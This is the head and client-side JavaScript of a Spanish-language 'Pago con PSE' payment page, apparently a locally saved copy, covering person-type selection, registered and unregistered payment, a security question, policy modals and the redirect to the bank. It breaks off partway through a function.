<!DOCTYPE html>
<html><head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <title>Pago con PSE</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link type="text/css" rel="stylesheet" href="pagopse_files/font_google.css">
    <link type="text/css" rel="stylesheet" href="pagopse_files/reset.min.css">
    <link type="text/css" rel="stylesheet" href="pagopse_files/bootstrap.css">
    <link type="text/css" rel="stylesheet" href="pagopse_files/formValidation.min.css">
    <link type="text/css" rel="stylesheet" href="pagopse_files/font-awesome.min.css">
    <link type="text/css" rel="stylesheet" href="pagopse_files/styleN.css">
    <link type="text/css" rel="stylesheet" href="pagopse_files/pseN.css">
    <link type="text/css" rel="stylesheet" href="pagopse_files/prettify.css">
    <link type="text/css" rel="stylesheet" href="pagopse_files/awesome-bootstrap-checkbox.css">
    <link type="text/css" rel="stylesheet" href="pagopse_files/uikit.css">
    <link type="text/css" rel="stylesheet" href="pagopse_files/bootstrap-pincode-input.css">
    <link rel="shortcut icon" href="https://registro.pse.com.co/PSEUserRegister/favicon.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com/">
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
    <link href="pagopse_files/css2.css" rel="stylesheet">

    <script type="text/javascript" async="" src="pagopse_files/js"></script><script async="" src="pagopse_files/analytics.js"></script><script type="text/javascript" src="pagopse_files/jquery.min.js"></script>
    
    <script type="text/javascript" src="pagopse_files/bootstrap.min_002.js"></script>
    <script type="text/javascript" src="pagopse_files/formValidation.min.js"></script>
    <script type="text/javascript" src="pagopse_files/bootstrap.min.js"></script>
    <script type="text/javascript" src="pagopse_files/es_CL.js"></script>
    <script type="text/javascript" src="pagopse_files/bowser.min.js"></script>
    <script type="text/javascript" src="pagopse_files/json3.min.js"></script>
    <script type="text/javascript" src="pagopse_files/PSE.js"></script>
    <script type="text/javascript" src="pagopse_files/jquery.bootstrap.wizard.min.js"></script>
    <script type="text/javascript" src="pagopse_files/respond.js"></script>
    <script type="text/javascript" src="pagopse_files/analytics.js"></script>

    <script type="text/javascript" src="pagopse_files/prettify.js"></script>
    <script type="text/javascript" src="pagopse_files/html5shiv.js"></script>
    <script src="pagopse_files/popper.min.js"></script>

    <script type="text/javascript">
        (function (i, s, o, g, r, a, m) {
            i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
                (i[r].q = i[r].q || []).push(arguments)
            }, i[r].l = 1 * new Date(); a = s.createElement(o),
                m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
        })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');

        ga('create', 'UA-37284652-8', 'auto');
        ga('send', 'pageview');
    </script>
    <script type="text/javascript" src="pagopse_files/fingerprint.min.js"></script>
    <script type="text/javascript">

        var prefs;
        var userdata;
        var userquestionanswer;
        var currentPage = "StartTransaction.htm";
        var opcionCheck = "Yes";
        var personaCheck = "nat";
        var tipoPersona;
        var accion;
        var mensajes;
        var pagina;
        var returnPage;
        var policytype;
        var headers = {};
        var hasAceptedPolicyChange = false;
        var documentsAccepted = false;

        function startForm() {

            setCloseNotifications();

            if (qs("enc") == null) {
                $("#all").hide();
                returnPage = currentPage;
                mensajes = "La página web solicitada no se encuentra disponible, ingresa nuevamente desde el inicio.";
                showPagina('pageMensajeError');
                return;
            }

            $(window).load(function () {
                startFingerprint();
            });

            $("#trRegistradoPN").hide();
            $("#trRegistradoPJ").hide();
            $("#trRegistrar").hide();

            $("#rdUsertype0").click(function () { onChangeOption(); });
            $("#rdUsertype1").click(function () { onChangeOption(); });
            $("#rdOptionYes").click(function () { onChangeOption(); });
            $("#rdOptionNo").click(function () { onChangeOption(); });
            $("#rdOptionNow").click(function () { onChangeOption(); });

            $.ajax({
                url: "api/GetPreferences",
                type: "POST",
                headers: headers,
                contentType: "application/json; charset=utf-8",
                data: JSON.stringify({ 'page': 'transaction', 'enc': qs("enc"), 'auth': readCookie('PSEAuth') }),
                dataType: "json",
                success: onGetPreferencesSuccess,
                error: onGetPreferencesError,
                async: false
            });
        }

        function setCloseNotifications() {
            window.pagehide = window.onunload = window.onbeforeunload = notifyServerFromClose;
            $(document).keydown(function (e) {
                if (e.key == "F5") {
                    clearNotifications();
                }
            });
        }

        function clearNotifications() {
            window.pagehide = window.onunload = window.onbeforeunload = null;
        }

        function notifyServerFromClose(e) {
            abandonPayment(3);
        }

        function onGetPreferencesSuccess(data) {
            if (data != null) {
                if (data == 'ErrorVerifyEntPendTrans') {
                    window.open("StartTransactionF.htm", "_self");
                }
                else {
                    var arreglo, i;
                    arreglo = data.split('|');
                    if (arreglo.length > 4) {
                        data = arreglo[4];
                    }
                    prefs = JSON.parse(data);
                    setupCSRFToken(prefs, headers);
                    if (prefs.AuthName.length > 0) {
                        redirectToBankWithSession(prefs.AuthName, prefs.SessionRedirectTime);
                    }
                    else {
                        showPreferences();
                        $("#rdOptionYes").prop("checked", true);
                    }
                }
            }
            else {
                returnPage = currentPage;
                mensajes = "Ocurrió un error obteniendo los datos para mostrar la página, inténtalo nuevamente.";
                showPagina('pageMensajeError');
            }
        }

        function redirectToBankWithSession(name, redirectTime) {
            $('#nombreUsu').html(name);
            showPagina('divProcessingSession');
            setTimeout(function () { redirectToBank(false); }, redirectTime);
        }

        function onGetPreferencesError(error) {
            returnPage = currentPage;
            mensajes = 'Ocurrió un error obteniendo los datos para mostrar la página, inténtalo nuevamente. Status: ' + error.status + " - " + error.statusText;
            showPagina('pageMensajeError');
        }

        function showPreferences() {
            setupPersonalization(prefs, [["PNEMail", "TOOLTIP_PNEMAIL"], ["PJNIT", "TOOLTIP_PJNIT"], ["PJEMail", "TOOLTIP_PJEMAIL"], ["PJEMail", "TOOLTIP_PJEMAIL"], ["QuestionResponse", "TOOLTIP_QUESTION"], ["ddTipoIdentificacion", "TOOLTIP_CAMPO_TIPOIDENTIFICACION"], ["txtNumeroIdentificacion", "TOOLTIP_CAMPO_NUMEROIDENTIFICACION"], ["txtNITPJ", "TOOLTIP_CAMPO_NUMEROIDENTIFICACION_PJ"], ["txtNombre", "TOOLTIP_CAMPO_NOMBRE_PN"], ["txtNombrePJ", "TOOLTIP_CAMPO_NOMBRE_PJ"], ["txtEMail", "TOOLTIP_CAMPO_EMAIL"], ["txtNumeroCelular", "TOOLTIP_CAMPO_TELEFONO_CELULAR"], ["txtDireccionPN", "TOOLTIP_CAMPO_DIRECCION"], ["txtDireccionPJ", "TOOLTIP_CAMPO_DIRECCION"], ["chkDisclaimerDiv", "TOOLTIP_CAMPO_DISCLAIMERTERMINOS"], ["chkDisclaimerInModal", "TOOLTIP_CAMPO_DISCLAIMERTERMINOS"]]);
            $('[data-toggle="tooltip"]').tooltip();

            $("#rdUsertype0").prop("checked", true);
            if (prefs.UserType == "0") {
                $("#trRegistradoPN").show("slow");
            }
            else {
                onClickPersona('jur');
            }
            if (!prefs.EnableNoRegister) {
                $("#rdOptionDeleteP").hide();
                $("#rdOptionNo").hide();
                $('#spnOptionNo').hide();
            }
            $("#rdOptionYes").prop("checked", true);
        }

        function getPersonType() {
            if ($("#rdUsertype0").is(":checked"))
                return "0";
            else
                return "1";
        }

        function getOption() {
            if ($("#rdOptionYes").is(":checked"))
                return "Yes";
            else if ($("#rdOptionNo").is(":checked"))
                return "No";
            else
                return "Now";
        }

        function getEMail() {
            if ($("#rdUsertype0").is(":checked"))
                return $("#PNEMail").val();
            else
                return $("#PJEMail").val();
        }

        function onClickPersona(persona) {
            if (persona == 'nat') {
                if ($("#rdUsertype1").is(":checked")) {
                    document.getElementById('rdUsertype0').checked = true;
                    onChangePersona();
                }
            }
            else {
                if ($("#rdUsertype0").is(":checked")) {
                    document.getElementById('rdUsertype1').checked = true;
                    onChangePersona();
                }
            }
        }

        function onChangePersona() {
            if (personaCheck == "nat" && $("#rdUsertype1").is(":checked")) {
                personaCheck = "jur";
                var tamanoP = document.documentElement.clientWidth;
                if (tamanoP < 992) {
                    $("#botonesSTPN2").removeClass("stpnS2");
                    $("#botonesSTPN2").addClass("stpjS2");
                }
                $("#id_per_naturalP").removeClass("per_natural_checkP");
                $("#id_per_naturalP").addClass("per_naturalP");
                $("#id_per_natural").removeClass("per_natural_check");
                $("#id_per_natural").addClass("per_natural");
                $("#id_per_juridicaP").removeClass("per_juridicaP");
                $("#id_per_juridicaP").addClass("per_juridica_checkP");
                $("#id_per_juridica").removeClass("per_juridica");
                $("#id_per_juridica").addClass("per_juridica_check");
                document.getElementById("id_per_natural_IMG").src = "assets/img/natural.svg";
                document.getElementById("id_per_juridica_IMG").src = "assets/img/juridica_check.svg";

                $("#id_per_natural_IMG").removeClass("per_natural_check_IMGCss");
                $("#id_per_natural_IMG").addClass("per_natural_IMGCss");
                $("#id_per_juridica_IMG").removeClass("per_juridica_IMGCss");
                $("#id_per_juridica_IMG").addClass("per_juridica_check_IMGCss");

                $("#div_registro_menuST").removeClass("div_registro_menuSTPN");
                $("#div_registro_menuST").addClass("div_registro_menuSTPJ");

                $("#movilACHST").removeClass("movilACHSTPN");
                $("#movilACHST").addClass("movilACHSTPJ");

                $("#movilACHSTCss").removeClass("movilACHSTPNCss");
                $("#movilACHSTCss").addClass("movilACHSTPJCss");

                $("#pageFooter").removeClass("pageFooterSTPNCss");
                $("#pageFooter").addClass("pageFooterSTPJCss");

                $("#lineaPN").hide();
                $("#lineaPJ").show();
                onChangeOption();
            }
            else if (personaCheck == "jur" && $("#rdUsertype0").is(":checked")) {
                personaCheck = "nat";
                var tamanoP = document.documentElement.clientWidth;
                if (tamanoP < 992) {
                    $("#botonesSTPN2").removeClass("stpjS2");
                    $("#botonesSTPN2").addClass("stpnS2");
                }
                $("#id_per_juridicaP").removeClass("per_juridica_checkP");
                $("#id_per_juridicaP").addClass("per_juridicaP");
                $("#id_per_juridica").removeClass("per_juridica_check");
                $("#id_per_juridica").addClass("per_juridica");
                $("#id_per_naturalP").removeClass("per_naturalP");
                $("#id_per_naturalP").addClass("per_natural_checkP");
                $("#id_per_natural").removeClass("per_natural");
                $("#id_per_natural").addClass("per_natural_check");
                document.getElementById("id_per_natural_IMG").src = "assets/img/natural_check.svg";
                document.getElementById("id_per_juridica_IMG").src = "assets/img/juridica.svg";

                $("#id_per_juridica_IMG").removeClass("per_juridica_check_IMGCss");
                $("#id_per_juridica_IMG").addClass("per_juridica_IMGCss");
                $("#id_per_natural_IMG").removeClass("per_natural_IMGCss");
                $("#id_per_natural_IMG").addClass("per_natural_check_IMGCss");

                $("#div_registro_menuST").removeClass("div_registro_menuSTPJ");
                $("#div_registro_menuST").addClass("div_registro_menuSTPN");

                $("#movilACHST").removeClass("movilACHSTPJ");
                $("#movilACHST").addClass("movilACHSTPN");

                $("#movilACHSTCss").removeClass("movilACHSTPJCss");
                $("#movilACHSTCss").addClass("movilACHSTPNCss");

                $("#pageFooter").removeClass("pageFooterSTPJCss");
                $("#pageFooter").addClass("pageFooterSTPNCss");

                $("#lineaPJ").hide();
                $("#lineaPN").show();
                onChangeOption();
            }
        }

        function onChangeOption() {
            if (opcionCheck == "Yes") {
                $("#rdOptionCreateP").removeClass("btn-option-click");
                $("#rdOptionCreateP").addClass("btn-option");
            }
            else if (opcionCheck == "No") {
                $("#rdOptionUpdateP").removeClass("btn-option-click");
                $("#rdOptionUpdateP").addClass("btn-option");
            }
            else if (opcionCheck == "Now") {
                $("#rdOptionDeleteP").removeClass("btn-option-click");
                $("#rdOptionDeleteP").addClass("btn-option");
            }
            if ($("#rdOptionYes").is(":checked")) {
                opcionCheck = "Yes";
                $("#rdOptionCreateP").removeClass("btn-option");
                $("#rdOptionCreateP").addClass("btn-option-click");

                if ($("#rdUsertype0").is(":checked")) {
                    $("#trRegistradoPN").show("slow");
                    $("#trRegistradoPJ").hide();
                }
                else {
                    $("#trRegistradoPJ").show("slow");
                    $("#trRegistradoPN").hide();
                }
                $("#trRegistrar").hide();
            }
            else if ($("#rdOptionNo").is(":checked")) {
                opcionCheck = "No";
                $('#form1').removeAttr("class");

                $("#trRegistradoPN").hide();
                $("#trRegistradoPJ").hide();
                $("#trRegistrar").show("slow");

                if ($("#rdUsertype0").is(":checked")) {
                    document.title = "PSE - Pago sin Registro Persona Natural";
                    $('#ddTipoIdentificacion').empty();
                    $('#ddTipoIdentificacion').append($('<option>', { value: 11, text: 'Registro civil de nacimiento' }));
                    $('#ddTipoIdentificacion').append($('<option>', { value: 12, text: 'Tarjeta de identidad' }));
                    $('#ddTipoIdentificacion').append($('<option>', { value: 13, text: 'Cedula de ciudadania' }));
                    $('#ddTipoIdentificacion').append($('<option>', { value: 21, text: 'Tarjeta de extranjeria' }));
                    $('#ddTipoIdentificacion').append($('<option>', { value: 22, text: 'Cedula de extranjeria' }));
                    $('#ddTipoIdentificacion').append($('<option>', { value: 41, text: 'Pasaporte' }));
                    $('#ddTipoIdentificacion').append($('<option>', { value: 42, text: 'Documento de identificacion extranjero' }));
                    $('#ddTipoIdentificacion').prop("disabled", false);
                    $('#ddTipoIdentificacion').val("13");
                }
            }
            else {
                opcionCheck = "Now";
                clearNotifications();
                var redireccion = "enc=" + qs("enc") + "&Mode=Volver&TipoPersona=" + getPersonType();
                var tamanoP = document.documentElement.clientWidth;
                if (tamanoP > 991) {
                    if (getPersonType() == 0)
                        redireccion = "CreateRegisterPNLG.htm?" + redireccion
                    else
                        redireccion = "CreateRegisterPJLG.htm?" + redireccion
                }
                else {
                    if (getPersonType() == 0)
                        redireccion = "CreateRegisterPNS.htm?" + redireccion
                    else
                        redireccion = "CreateRegisterPJS.htm?" + redireccion
                }
                window.location.href = redireccion;
            }
        }

        function loadRegisterAndChooseQuestion() {
            $.ajax({
                url: "api/LoadRegisterAndChooseQuestion",
                type: "POST",
                headers: headers,
                contentType: "application/json; charset=utf-8",
                data: JSON.stringify({ 'enc': qs("enc"), 'personType': getPersonType(), 'email': getEMail(), 'NIT': $("#PJNIT").val(), 'InPayment': 'true' }),
                dataType: "json",
                success: loadRegisterAndChooseQuestionSuccess,
                error: loadRegisterAndChooseQuestionError,
                async: false
            });
        }

        function loadRegisterAndChooseQuestionSuccess(data) {
            if (data != null) {
                userdata = JSON.parse(data);
            }
            else {
                returnPage = currentPage;
                mensajes = 'Ocurrió un error cargando el usuario para pago, inténtalo nuevamente.';
                showPagina('pageMensajeError');
            }
        }

        function loadRegisterAndChooseQuestionError(error) {
            if (error.status == 401) {
                userdata = { 'Success': false, 'ErrorMessage': '', 'URL': window.location.href };
                alert('La sesión expiro; la página se volverá a cargar automáticamente.');
            }
            else {
                returnPage = currentPage;
                mensajes = 'Ocurrió un error cargando el usuario para pago, inténtalo nuevamente. Status: ' + error.status + " - " + error.statusText;
                showPagina('pageMensajeError');
            }
        }

        function validateQuestion() {
            $.ajax({
                url: "api/ValidateQuestion",
                type: "POST",
                headers: headers,
                contentType: "application/json; charset=utf-8",
                data: JSON.stringify({ 'rdPersona': getPersonType(), 'answer': $("#QuestionResponse").val() }),
                dataType: "json",
                success: validateQuestionSuccess,
                error: validateQuestionError,
                async: false
            });
        }

        function validateQuestionSuccess(data) {
            if (data != null) {
                userquestionanswer = JSON.parse(data);
            }
            else {
                returnPage = currentPage;
                mensajes = "Ocurrió un error validando la pregunta de seguridad del usuario, inténtalo nuevamente.";
                showPagina('pageMensajeError');
            }
        }

        function validateQuestionError(error) {
            returnPage = currentPage;
            mensajes = 'Ocurrió un error validando la pregunta de seguridad del usuario, inténtalo nuevamente. Status: ' + error.status + " - " + error.statusText;
            showPagina('pageMensajeError');
        }

        function loadUserPolicy(type) {
            policytype = type;
            $.ajax({
                url: "api/LoadUserPolicy",
                type: "POST",
                headers: headers,
                contentType: "application/json; charset=utf-8",
                data: JSON.stringify({ 'type': type }),
                dataType: "json",
                success: loadUserPolicySuccess,
                error: loadUserPolicyError
            });
        }

        function loadUserPolicySuccess(data) {
            if (data != null) {
                $("#currentUserPolicy").html(data);
                if (policytype == "Registered")
                    $("#chkDisclaimerInModal").show();
                else
                    $("#chkDisclaimerInModal").hide();
                showPagina("PageDisclaimerModal");
            }
            else {
                returnPage = currentPage;
                mensajes = "Ocurrió un error cargando la política de usuarios, inténtalo nuevamente.";
                showPagina('pageMensajeError');
            }
        }

        function followAfterPolicy() {
            if ($("#chkDisclaimer").is(":checked"))
                processStep();
        }

        function loadUserPolicyError(error) {
            returnPage = currentPage;
            mensajes = 'Ocurrió un error cargando la política de usuarios, inténtalo nuevamente. Status: ' + error.status + " - " + error.statusText;
            showPagina('pageMensajeError');
        }

        function acceptUserPolicy() {
            $.ajax({
                url: "api/AcceptUserPolicy",
                type: "POST",
                headers: headers,
                contentType: "application/json; charset=utf-8",
                data: "",
                dataType: "json",
                success: acceptUserPolicySuccess,
                error: acceptUserPolicyError,
                async: false
            });
        }

        function acceptUserPolicySuccess(data) {
            if (data != true) {
                returnPage = currentPage;
                mensajes = "Ocurrió un error aceptando la nueva política de usuarios, inténtalo nuevamente.";
                showPagina('pageMensajeError');
            }
        }

        function acceptUserPolicyError(error) {
            returnPage = currentPage;
            mensajes = 'Ocurrió un error aceptando la nueva política de usuarios, inténtalo nuevamente. Status: ' + error.status + " - " + error.statusText;
            showPagina('pageMensajeError');
        }

        function redirectToBank(checkFinger) {
            if (checkFinger) {
                var seconds = getFingerprintElapsedSeconds();
                if ((finger == null || finger.length == 0) && seconds < 10) {
                    alert('Por favor espere ' + Math.ceil(10 - seconds).toString() + ' segundos para seguir con la transacción');
                    return;
                }
            }
            $("#divProcessing").show();
            $("#btnSeguir").prop("disabled", true);
            $.ajax({
                url: "api/RedirectToBank",
                type: "POST",
                headers: headers,
                contentType: "application/json; charset=utf-8",
                data: JSON.stringify({ 'auth': readCookie('PSEAuth'), 'enc': qs("enc"), 'Fingerprint': getFinger(), 'rdPersona': getPersonType(), 'rdOption': getOption(), 'EMail': getEMail(), 'NIT': $("#PJNIT").val(), 'Answer': $("#QuestionResponse").val(), 'txtNombre': getName(), 'ddTipoIdentificacion': getIdType(), 'txtNumeroIdentificacion': getId(), 'txtDireccion': getAddress(), 'txtNumeroCelular': $("#txtNumeroCelular").val(), 'txtEMail': $("#txtEMail").val(), 'hasAceptedPolicyChange': hasAceptedPolicyChange }),
                dataType: "json",
                success: redirectToBankSuccess,
                error: redirectToBankError
            });
        }

        function getFinger() 
        { 
            try
            {
                if (finger != null)
                    return finger;
                else
                    return '';
            }
            catch (error)
            {
                console.log(error.message);
                return '';
            }
        }

        function getName() {
            if (getPersonType() == "0")
                return $("#txtNombre").val();
            else
                return $("#txtNombrePJ").val();
        }

        function getIdType() {
            if (getPersonType() == "0")
                return $("#ddTipoIdentificacion").val();
            else
                return "31";
        }

        function getId() {
            if (getPersonType() == "0")
                return $("#txtNumeroIdentificacion").val();
            else
                return $("#txtNITPJ").val();
        }

        function getAddress() {
            if (getPersonType() == "0")
                return $("#txtDireccionPN").val();
            else
                return $("#txtDireccionPJ").val();
        }

        function redirectToBankSuccess(data) {
            try {
                if (data != null) {
                    var resp = JSON.parse(data);
                    checkAuth(resp);
                    if (resp.Success) {
                        clearNotifications();
                        window.location.href = resp.URL;
                    }
                    else {
                        if (resp.Reload) {
                            clearNotifications();
                            window.location.href = window.location.href;
                        }
                        else {
                            alert(resp.ErrorMessage);
                            if ($("#divProcessingSession").length) {
                                $("#divProcessingSession").hide();
                                abandonPayment(1);
                            }
                        }
                    }
                }
                else {
                    returnPage = currentPage;
                    mensajes = "Ocurrió un error seguindo con la transacción, inténtalo nuevamente.";
                    showPagina('pageMensajeError');
                }
            }
            finally {
                $("#divProcessing").hide();
                $("#btnSeguir").prop("disabled", false);
            }
        }

        function checkAuth(resp) {
            if (resp.hasOwnProperty("Auth")) {
                createCookie("PSEAuth", resp.Auth, resp.AuthValidity);
            }
        }

        function redirectToBankError(error) {
            try {
                returnPage = currentPage;
                mensajes = 'Ocurrió un error seguindo con la transacción, inténtalo nuevamente. Status: ' + error.status + " - " + error.statusText;
                showPagina('pageMensajeError');
            }
            finally {
                $("#divProcessing").hide();
                $("#btnSeguir").prop("disabled", false);
            }
        }

        function processStep() {
            $('#form1').data('formValidation').validate();
            if ($('#form1').data('formValidation').isValid()) {
                if ($("#rdOptionYes").is(":checked")) {

                    if (!$("#trValidation").is(':visible') && ((getPersonType() == "0" && prefs.USERREGISTERUSEQUESTIONSPN) || (getPersonType() == "1" && prefs.USERREGISTERUSEQUESTIONSPJ))) {
                        loadRegisterAndChooseQuestion();
                        if (userdata.Success) {
                            if (userdata.Question != null) {
                                $("#lblQuestion").html(userdata.Question);
                                $("#trValidation").show("slow");
                            }
                        }
                        else {
                            if (userdata.ErrorMessage.length > 0)
                                alert(userdata.ErrorMessage);
                            else {
                                clearNotifications();
                                window.location.href = userdata.URL;
                            }
                        }
                        return;
                    }

                    if ($("#trValidation").is(':visible') || (getPersonType() == "0" && !prefs.USERREGISTERUSEQUESTIONSPN) || (getPersonType() == "1" && !prefs.USERREGISTERUSEQUESTIONSPJ)) {
                        loadRegisterAndChooseQuestion();
                        if (userdata.Success) {
                            if ((getPersonType() == "0" && prefs.USERREGISTERUSEQUESTIONSPN) || (getPersonType() == "1" && prefs.USERREGISTERUSEQUESTIONSPJ)) {
                                validateQuestion();
                            }
                            else {
                                userquestionanswer = new Object();
                                userquestionanswer.Success = true;
                                userquestionanswer.EnableWithoutRegister = false;
                            }

                            if (userquestionanswer.EnableWithoutRegister && prefs.EnableNoRegister) {
                                $("#rdOptionNo").prop('checked', true);
                                $("#rdOptionYes").prop("disabled", true);
                                onChangeOption();
                                $("#lblIncorrectAnswersExceded").html(userquestionanswer.ErrorMessage);
                                $("#divIncorrectAnswers").show("slow");
                            }

                            if (userquestionanswer.Success) {
                                if ((!userdata.UserPolicyMustBeAcepted || $("#chkDisclaimer").is(":checked")) && (userdata.UserPendingDocuments.length == 0 || isDocumentsChecked())) {
                                    if (userdata.UserPolicyMustBeAcepted)
                                        acceptUserPolicy();
                                    if (userdata.UserPendingDocuments.length > 0)
                                        acceptUserDocuments();
                                    redirectToBank(true);
                                }
                                else {
                                    if (userdata.UserPolicyMustBeAcepted)
                                        loadUserPolicy("Registered");
                                    if (userdata.UserPendingDocuments.length > 0)
                                        loadUserDocuments();
                                }
                            }
                            else {
                                $("#lblQuestion").html(userquestionanswer.Question);
                                alert(userquestionanswer.ErrorMessage);
                            }
                        }
                        else {
                            if (userdata.ErrorMessage.length > 0) {
                                returnPage = currentPage;
                                mensajes = userdata.ErrorMessage;
                                showPagina('pageMensajeError');
                            }
                            else {
                                clearNotifications();
                                window.location.href = userdata.URL;
                            }
                        }
                    }

                }
                else {
                    redirectToBank(true);
                }
            }
        }

        function abandonPayment(type) {
            $("#divProcessing").show();
            $("#btnCancel").prop("disabled", true);
            $.ajax({
                url: "api/AbandonPayment",
                type: "POST",
                headers: headers,
                contentType: "application/json; charset=utf-8",
                data: JSON.stringify({ 'enc': qs("enc"), 'type': type }),
                dataType: "json",
                success: onAbandonPaymentSuccess,
                error: onAbandonPaymentError
            });
        }

        function onAbandonPaymentSuccess(data) {
            try {
                if (data != null) {
                    var abd = JSON.parse(data);
                    if (abd.Success) {
                        clearNotifications();
                        window.location.href = abd.URL;
                    }
                    else
                        alert(abd.ErrorMessage);
                }
                else {
                    returnPage = currentPage;
                    mensajes = "Ocurrió un error abandonando el pago, inténtalo nuevamente.";
                    showPagina('pageMensajeError');
                }
            }
            finally {
                $("#divProcessing").hide();
                $("#btnCancel").prop("disabled", false);
            }
        }

        function onAbandonPaymentError(error) {
            try {
                returnPage = currentPage;
                mensajes = 'Ocurrió un error abandonando el pago, inténtalo nuevamente. Status:' + error.status + " - " + error.statusText;
                showPagina('pageMensajeError');
            }
            finally {
                $("#divProcessing").hide();
                $("#btnCancel").prop("disabled", false);
            }
        }

        //JGC
        var popupAdded = false;
        function checkPolicyChangeDiv() {
            if (prefs.PopupEnabled) {
            //if (true) {
                if (!popupAdded) {
                    popupAdded = true;
                    returnPage = currentPage;
                    $('#politicasMensajes').html(prefs.PopupHTML);
                    showPagina("pagePoliticas");
                }
            }
        }

        function acceptPolicyChange() {
            hasAceptedPolicyChange = true;
            $('#divPolicyChange').remove();
        }

        function createInfoModal(title, url, type) {
            var modal = "<div class=\"modal fade\" id=\"infoModal\" style=\"display: none\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"disclaimerModal\" aria-hidden=\"true\">" +
                "<div class=\"modal-dialog\" role=\"document\">" +
                "    <div class=\"modal-content\">" +
                "        <div class=\"modal-header\">" +
                "               <div class=\"EncabezadoPL1Css\">" +
                "                    <div class=\"pseLogoCssI\"><img src=\"assets/img/NFbanner-izq.svg\" style=\"height: 72px\"></div>" +
                "                    <div class=\"pseLogoCssD\"><img src=\"assets/img/NFbanner-der.svg\"></div>" +
                "                </div>" +
                "        </div>" +
                "        <div class=\"modal-body\" id=\"currentInfo\" style=\"overflow-y:auto; top: 96px; max-height: 420px;\">";
            if (type == "PDF")
                modal += "  <embed src=\"" + url + "\" type=\"application/pdf\" frameborder=\"0\" width=\"100%\" height=\"300px\" />";
            else
                modal += "  <iframe src=\"" + url + "\" frameborder=\"0\" width=\"100%\" height=\"300px\" />";
            modal += "        </div>" +
                "        <div class=\"modal-footer\" >" +
                "                <div class=\"col-lg-3 col-md-3 col-sm-3 col-xs-3\">" +
                "                    <span class=\"pull-left\"><img src=\"assets/img/footer.png\" class=\"img-footer\"></span>" +
                "                </div>" +
                "                <div class=\"col-lg-3 col-md-3 col-sm-3 col-xs-3 col-lg-offset-6 col-md-offset-6 col-sm-offset-6 col-xs-offset-6 FooterButtonDivCss\">" +
                "                    <button type=\"button\" onclick=\"deleteInfoModal();\" class=\"btn_cerrar_footer\" data-dismiss=\"modal\" >Cerrar</button>" +
                "                </div>" +
                "        </div>" +
                "    </div>" +
                "</div>" +
                "</div>";
            $("body").append(modal);
            $('#infoModal').on('hidden.bs.modal', function () {
                $(this).remove();
            });
            $("#infoModal").modal("show");
        }

        function loadUserDocuments() {
            var modal = '<div class="modal fade" id="modalTerms" style="display: none" tabindex="-1" role="dialog" aria-labelledby="modalTerms" aria-hidden="true">' +
                '<div class="modal-dialog" role="document">' +
                '    <div class="modal-content" style="height:440px">' +
                '        <div class="modal-header">' +
                '               <div class="EncabezadoPLCss">' +
                '                    <div class="pseLogoCssI"><img src="assets/img/NFbanner-izq.svg" style="height: 72px"></div>' +
                '                    <div class="pseLogoCssD"><img src="assets/img/NFbanner-der.svg"></div>' +
                '                </div>' +
                '        </div>' +
                '        <div style="text-align: center; position: absolute; top: 100px; right: 0; left: 0; margin: auto; ">' +
                '            <img src="assets/img/Tratamiento.svg" style="width: 79.41px" />' +
                '        </div>' +
                '        <div class="modal-body text-center" style="height:200px; text-align: center; position: absolute; top:200px; right:0; left: 0; margin: auto;">';
            if (userdata.UserPendingDocuments.indexOf("personaldatapolicy") >= 0) {
                modal += '      <div id="chkDocumentDiv1" data-toggle="tooltip" data-placement="left" class="checkbox checkbox-success">' +
                    '       <input id="chkDocument1" name="chkDocument1" type="checkbox" value="" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="Debes aceptar el tratamiento de sus datos personales para seguir con el pago." />' +
                    '       <label style="color: #183372;" for="chkDocument1">He leído y acepto <a style="color: #183372;" href="#" onclick="loadUserDocument(\'personaldatapolicy\');">el tratamiento de mis datos personales.</a></label>' +
                    '       </div>';
            }
            if (userdata.UserPendingDocuments.indexOf("termsandconditions") >= 0) {
                modal += '      <div id="chkDocumentDiv2" data-toggle="tooltip" data-placement="left" class="checkbox checkbox-success">' +
                    '       <input id="chkDocument2" name="chkDocument2" type="checkbox" value="" data-toggle="tooltip" data-placement="top" data-fv-notempty="true" data-fv-notempty-message="Debes aceptar los términos y condiciones para seguir con el pago." />' +
                    '       <label style="color: #183372;" for="chkDocument2">He leído y acepto <a style="color: #183372;" href="#" onclick="loadUserDocument(\'termsandconditions\');">los términos y condiciones.</a></label>' +
                    '       </div>';
            }
            modal += '        </div>' +
                '        <div class="modal-footer" style="text-align: center; position: absolute; top:300px; right:0; left: 0; margin: auto;">' +
                '                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-3">' +
                '                    <span class="pull-left"><img src="assets/img/footer.png" class="img-footer"></span>' +
                '                </div>' +
                '                <div class="col-lg-3 col-md-3 col-sm-3 col-xs-3 col-lg-offset-6 col-md-offset-6 col-sm-offset-6 col-xs-offset-6 FooterButtonDivCss">' +
                '                    <button type="button" onclick="followUserDocument();" class="btn_cerrar_footer" >Ir al Banco</button>' +
                '                </div>' +
                '        </div>' +
                '    </div>' +
                '</div>' +
                '</div>';
            $("body").append(modal);
            $('#modalTerms').on('hidden.bs.modal', function () {
                $(this).remove();
            });
            $("#modalTerms").modal("show");
        }

        function followUserDocument() {
            if (userdata.UserPendingDocuments.indexOf("personaldatapolicy") >= 0 && !$("#chkDocument1").is(":checked")) {
                alert('Debes aceptar el tratamiento de sus datos personales para seguir con el pago.');
                return false;
            }
            if (userdata.UserPendingDocuments.indexOf("termsandconditions") >= 0 && !$("#chkDocument2").is(":checked")) {
                alert('Debes aceptar los términos y condiciones para seguir con el pago.');
                return false;
            }
            documentsAccepted = true;
            processStep();
            return true;
        }

        function isDocumentsChecked() {
            return documentsAccepted;
        }

        function loadUserDocument(type) {
            if (type != null) {
                switch (type) {
                    case "personaldatapolicy":
                        createInfoModal("Aviso de Privacidad y Política de Tratamiento de Datos Personales", "LoadUserDocument.aspx?type=personaldatapolicy", "PDF");
                        break;
                    case "termsandconditions":
